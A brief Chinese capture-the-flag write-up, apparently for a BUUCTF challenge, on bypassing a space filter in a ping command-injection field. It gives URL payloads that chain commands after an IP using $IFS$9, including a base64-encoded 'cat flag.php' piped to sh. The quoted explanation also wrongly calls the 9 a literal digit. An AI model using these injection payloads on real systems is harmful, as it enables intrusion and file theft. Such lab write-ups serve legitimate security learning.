过滤了空格

> 在 bash 脚本中，`$IFS$9` 表示将两个值连接在一起：`$IFS` 的值和数字 `9`。它本身**通常没有特殊的含义**，其具体作用取决于上下文。
>
> 下面详细解释一下：
>
> **1. `$IFS`：内部字段分隔符 (Internal Field Separator)**
>
> - `$IFS` 是 bash 中的一个特殊环境变量，用于定义**字段分隔符**。
> - 它指定了在进行**单词分割**时，哪些字符被用作分隔符。
> - 单词分割是 shell 在处理命令替换、变量替换等操作时，将字符串拆分成多个单词的过程。
> - 默认情况下，`$IFS` 的值是**空格、制表符和换行符**。
> - 可以修改 `$IFS` 的值来改变单词分割的行为。
>
> **2. `$9`：位置参数**
>
> - `$9` 是一个**位置参数**，表示传递给脚本或函数的**第九个参数**。
> - 例如，如果你运行脚本 `myscript.sh arg1 arg2 arg3 arg4 arg5 arg6 arg7 arg8 arg9`，那么 `$9` 的值就是 `arg9`。
> - 如果脚本或函数没有接收到第九个参数，`$9` 将为空。

```(空)
http://fa0d2a34-039f-4877-9a15-9fed0ffbb59b.node5.buuoj.cn:81/?ip=127.0.0.1;cat$IFS$9`ls`
```

![1734585465097](https://gitee.com/bx33661/image/raw/master/path/1734585465097.png)

```(空)
/?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
```

Y2F0IGZsYWcucGhw|base64\$IFS$1-d|sh
- Y2F0IGZsYWcucGhw-->cat flag.php
- 解码
- 作为命令执行

![f2e847a5b789670225924a554bd3055](https://gitee.com/bx33661/image/raw/master/path/f2e847a5b789670225924a554bd3055.png)
